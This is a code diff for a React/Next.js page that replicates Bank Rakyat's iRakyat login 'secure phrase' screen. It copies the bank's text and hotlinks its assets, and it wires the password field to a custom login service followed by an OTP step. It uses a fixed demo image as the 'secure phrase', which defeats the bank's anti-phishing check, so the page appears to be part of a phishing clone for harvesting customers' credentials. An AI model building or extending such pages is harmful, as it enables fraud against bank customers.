@@ -1,17 +1,30 @@
 'use client';
-import { usernameAtom } from '@/atoms';
+import { accessTokenAtom, securePhraseAtom, usernameAtom } from '@/atoms';
 import LoginSidebar from '@/components/LoginSidebar';
 import Steps from '@/components/Steps';
+import { login } from '@/services/login';
+import { useMutation } from '@tanstack/react-query';
 import { useAtom } from 'jotai';
 import Image from 'next/image';
 import Link from 'next/link';
-import { useSearchParams } from 'next/navigation';
+import { useRouter, useSearchParams } from 'next/navigation';
 import React, { useState } from 'react';
 
 export default function SecurePhrase() {
-  const [username] = useAtom(usernameAtom);
-  console.log({ username });
+  const router = useRouter();
+  const loginMut = useMutation({
+    mutationFn: login,
+    onSuccess: (data) => {
+      console.log(data);
 
+      router.push('/otp');
+    },
+    onError: (error) => {
+      console.log(error);
+    },
+  });
+  const [username] = useAtom(usernameAtom);
+  const [password, setPassword] = useState('');
   const [errorVisible, setErrorVisible] = useState<'hidden' | 'inline'>(
     'hidden'
   );
@@ -19,10 +32,21 @@ export default function SecurePhrase() {
     'hidden'
   );
 
+  const [securePhrase] = useAtom(securePhraseAtom);
+  const [accessToken] = useAtom(accessTokenAtom);
+
   const handleCheck = () => {
     setNextStepVisible('inline');
   };
-  const handleSubmit = () => {};
+  const handleSubmit = () => {
+    if (!password.trim()) {
+      setErrorVisible('inline');
+      return;
+    } else {
+      setErrorVisible('hidden');
+      loginMut.mutate({ username, password, accessToken });
+    }
+  };
 
   return (
     <>
@@ -38,7 +62,6 @@ export default function SecurePhrase() {
             contact our Customer Service Representative at 1-300-80-5454.
             <a
               title="The unique secure phrase below is a security measure to confirm you are in the genuine iRakyat website. Please do not enter your password if the secure phrase and background colour is incorrect."
-              href="javascript:void(0)"
               className="text-[#337ab7]"
             >
               {' '}
@@ -79,7 +102,7 @@ export default function SecurePhrase() {
               Secure Phrase
             </h4>
             <div className="relative w-[120px] h-[35px]">
-              <Image alt="secure phrase image" src="/images/demo.jpg" fill />
+              <Image alt="secure phrase image" src={'/images/demo.jpg'} fill />
             </div>
           </div>
           <div className="mb-[15px] font-normal text-sm">
@@ -101,7 +124,8 @@ export default function SecurePhrase() {
               </button>
             </div>
           </div>
-          <div className="show">
+
+          <div className={nextStepVisible}>
             <div className="mb-[15px] font-normal text-sm ">
               <h3 className="mt-[50px] text-left text-[#dbdbdb] text-lg">
                 <b className="font-extrabold">Password:</b>
@@ -112,32 +136,37 @@ export default function SecurePhrase() {
                 name="password"
                 id="password"
                 tabIndex={1}
-                value={''}
-                onChange={(e) => {}}
+                value={password}
+                onChange={(e) => {
+                  setPassword(e.target.value);
+                }}
                 size={30}
-                className="bg-[#212529] text-white sborder-[#dbdbdb] outline-none border-solid border py-[5px] pr-[15px] pl-[35px] w-full bg-[url('https://payment.bankrakyat.com.my/fpxonline/fpxui/css/images/user-silhouette.svg')] bg-3.75 bg-no-repeat bg-[10px]"
+                className="bg-[#212529] text-white border-[#dbdbdb] outline-none border-solid border py-[5px] pr-[15px] pl-[35px] w-full bg-[url('https://payment.bankrakyat.com.my/fpxonline/fpxui/css/images/user-silhouette.svg')] bg-3.75 bg-no-repeat bg-[10px]"
                 style={{ fontSize: 'inherit' }}
               />
             </div>
             <div className="mt-[25px] flex justify-between gap-5 ">
               <input
                 type="button"
-                className="bg-[#e9730d] text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
+                className="bg-[#e9730d] disabled:opacity-50 text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
                 data-toggle="modal"
                 data-target="#myModal"
                 value="Cancel"
+                disabled={loginMut.isLoading}
               />
               <input
                 type="submit"
                 name="doSubmit"
                 id="doSubmit"
-                className="bg-[#e9730d] text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
-                value="Next"
+                className="bg-[#e9730d] disabled:opacity-50  text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
+                value={loginMut.isLoading ? 'Loading...' : 'Login'}
                 onClick={handleSubmit}
                 tabIndex={2}
+                disabled={loginMut.isLoading}
               />
             </div>
           </div>
+
           <div className="my-5">
             <p className="text-[#e9730d] text-sm">PROBLEM LOGIN</p>
             <a
